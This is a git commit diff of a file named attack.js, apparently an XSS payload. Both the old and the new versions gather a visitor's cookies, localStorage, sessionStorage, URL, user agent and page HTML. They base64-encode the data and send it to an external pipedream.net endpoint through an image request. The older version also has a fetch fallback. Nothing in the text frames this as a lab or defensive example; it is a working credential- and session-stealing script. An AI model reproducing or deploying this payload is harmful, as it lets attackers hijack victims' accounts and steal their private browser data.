8e876049aab0a7b90b59af84bc6616ea6417703f
usgeo-verification <zaidali6612@gmail.com>
2025-07-20 03:49:27 +0300

    Update attack.js

--- attack.js
+++ attack.js
@@ -1,25 +1,15 @@
 <script>
-(async () => {
-  try {
-    let data = {
-      cookies: document.cookie,
-      ua: navigator.userAgent,
-      loc: window.location.href,
-      ref: document.referrer,
-      local: JSON.stringify(localStorage),
-      session: JSON.stringify(sessionStorage),
-      html: document.documentElement.outerHTML.slice(0, 5000)
-    };
+  let data = {
+    cookies: document.cookie,
+    loc: location.href,
+    html: document.documentElement.outerHTML.slice(0, 1500),
+    ls: JSON.stringify(localStorage),
+    ss: JSON.stringify(sessionStorage),
+    ua: navigator.userAgent,
+    time: Date.now()
+  };
 
-    let img = new Image();
-    img.src = 'https://eoat1elxcyeymir.m.pipedream.net/?data=' + btoa(unescape(encodeURIComponent(JSON.stringify(data))));
-    document.body.appendChild(img);
-  } catch (e) {
-    fetch("https://eoat1elxcyeymir.m.pipedream.net", {
-      method: "POST",
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({error: e.toString()})
-    });
-  }
-})();
+  let img = new Image();
+  img.src = 'https://eoat1elxcyeymir.m.pipedream.net/?d=' + btoa(JSON.stringify(data));
+  document.body.appendChild(img);
 </script>
